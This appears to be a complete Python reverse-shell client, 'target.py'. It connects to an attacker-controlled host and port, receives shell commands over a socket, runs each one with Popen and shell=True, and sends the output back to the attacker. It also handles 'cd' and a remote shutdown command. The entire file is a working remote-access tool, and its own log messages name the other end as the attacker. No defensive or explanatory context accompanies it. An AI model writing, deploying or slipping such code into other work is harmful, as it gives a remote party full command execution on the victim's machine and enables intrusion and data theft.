# ========================================================================
# $File: target.py $
# $Date: 2019-01-21 23:03:50 $
# $Revision: $
# $Creator: Jen-Chieh Shen $
# $Notice: See LICENSE.txt for modification and distribution information
#                   Copyright © 2019 by Shen, Jen-Chieh $
# ========================================================================

import socket
import sys
import os
import locale
from subprocess import *

import command
import constant
import logger


DEFAULT_LOCALE = []


def __resolve_hp():
    """Reolve host and port."""

    # Resolve arguments.
    arg_len = len(sys.argv)

    if 2 <= arg_len:
        host = sys.argv[1]
    else:
        host = constant.HOST

    if 3 <= arg_len:
        port = int(sys.argv[2])
    else:
        port = constant.PORT

    return host, port


def main():
    """Program Entry point."""

    DEFAULT_LOCALE = locale.getdefaultlocale()[1]

    host, port = __resolve_hp()

    logger.info("Connecting to the Reverse Shell server...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        logger.info(f"Connecting to the attacker : {host}:{port}")
        s.connect((host, port))

        while True:
            # Send the path.
            path = os.path.dirname(os.path.abspath(__file__))
            s.sendall(path.encode(constant.ENCODE_TYPE))

            # Receive it.
            data = s.recv(constant.BUF_SIZE)
            if not data:
                break

            in_cmd = data.decode(constant.DECODE_TYPE)
            data_str = str(data)
            logger.info(f"Received: {data_str}");


            # Check if is internal command type.
            iicp = command.is_internal_command_prefix(in_cmd)
            iic = False
            if iicp:
                # Remove prefix, get the internal command.
                rl_cmd = in_cmd[1:]
                iic = command.is_internal_command(rl_cmd)
                if not iic:
                    logger.error(f"'{in_cmd}' is not recognized internal command.")

            if iic:
                # NOTE(jenchieh): Check possible command at this moment.
                if rl_cmd == command.Command.SHUTDOWN.value:
                    logger.info("Shutdown by attacker...")
                    break

            cd_path = in_cmd.split(" ")

            if "cd" in in_cmd:
                cd_param = cd_path[1]
                if ".." in cd_param:
                    os.chdir("..")
                elif os.path.isdir(cd_param):
                    os.chdir(cd_param)
                continue

            # Execute shell command.
            proc = Popen(in_cmd, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
            outs, errs = proc.communicate()

            output = "** Default output command... **".encode(constant.ENCODE_TYPE)

            if outs:
                output = outs
            if errs:
                output = errs

            # Send results
            s.sendall(output)

        logger.info("Cleaning the socket buffer...")
        s.shutdown(socket.SHUT_RDWR)
        s.close()

if __name__ == "__main__":
    main()
